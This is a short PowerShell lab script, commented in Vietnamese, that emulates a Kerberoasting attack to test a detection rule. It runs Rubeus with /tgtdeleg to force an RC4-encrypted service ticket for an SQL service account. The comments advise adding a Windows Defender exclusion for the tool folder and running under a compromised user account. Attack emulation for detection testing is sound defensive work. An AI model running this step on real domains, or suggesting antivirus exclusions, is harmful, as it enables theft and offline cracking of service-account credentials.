<#
.SYNOPSIS
    attack_rc4_downgrade_0x17.ps1
    Kich ban 2A (DEFAULT / loud): Kerberoasting ha cap ma hoa RC4-HMAC (0x17) nham vao
    SVC_HIS_Database. Sinh Event ID 4769 voi TicketEncryptionType = 0x17 -> V1 (SC2-V1) bat.
.NOTES
    CHAY TRONG LAB CO LAP (clinic.local)
    MITRE ATT&CK: T1558.003 (Kerberoasting).

    Vi sao can Rubeus (doc ky trong README.md thu muc nay):
    SVC_HIS_Database ho tro CA RC4 lan AES (xem Import-ClinicADUsers.ps1), nen client
    Windows Server 2022 xin ve se MAC DINH nhan AES256 (0x12), KHONG phai 0x17. Muon ep
    xuong 0x17 (de crack offline nhanh, va de V1 bat) phai dung /tgtdeleg cua Rubeus
    (thu thuat GSS-API ep cap ve RC4). Native .NET KHONG ep duoc. KHONG dung /rc4opsec:
    co nay LOC BO account da bat AES nen se bo qua dung SVC_HIS_Database -> khong sinh 0x17.

    PHU THUOC CHUA CO: Rubeus.exe (GhostPack) KHONG nam trong repo, bootstrap KHONG tai ve.
    Lay o: https://github.com/GhostPack/Rubeus (tai release hoac tu build), dat vao C:\Tools.
    Nho Add-MpPreference -ExclusionPath "C:\Tools" vi Defender gan co Rubeus.
    Co so 0x17 vs 0x12 va /tgtdeleg: xem docs/PROVENANCE_detection_rules.md va keep.md.

    Chay trong ngu canh tai khoan da chiem (vi du BS_BacSi001 bi chiem o WS01).
#>

$ErrorActionPreference = "SilentlyContinue"
$Rubeus = "C:\Tools\Rubeus.exe"
$Spn    = "MSSQLSvc/SRV02.clinic.local:1433"

Write-Host "[*] [SC2-2A DEFAULT] Kerberoast ha cap RC4 0x17 nham $Spn (muc tieu: V1 bat trung)." -ForegroundColor Cyan
Write-Host "    BAT DAU: $(Get-Date -Format 'o')" -ForegroundColor Yellow

if (-not (Test-Path $Rubeus)) {
    Write-Warning "Chua co Rubeus.exe trong C:\Tools. Tai tu github.com/GhostPack/Rubeus roi chay lai."
    Write-Warning "Khong the ep ma hoa 0x17 bang native PowerShell khi tai khoan ho tro AES -> bo qua pha nay."
    return
}

# Chi dung /tgtdeleg de ha cap RC4 0x17 tren account co bat RC4. KHONG dung /rc4opsec
# vi /rc4opsec loc BO cac account da bat AES (tuc la bo qua dung SVC_HIS_Database) -> khong sinh 0x17.
# Kiem chung lai o Rubeus README truoc khi chay (muc kerberoast /tgtdeleg vs /rc4opsec).
& $Rubeus kerberoast /tgtdeleg /spn:$Spn /nowrap | Out-Null

Write-Host "    KET THUC: $(Get-Date -Format 'o')" -ForegroundColor Yellow
Write-Host "[+] [SC2-2A] Xong. Kiem tra DC01 -> Security log -> Event ID 4769, TicketEncryptionType 0x17." -ForegroundColor Green
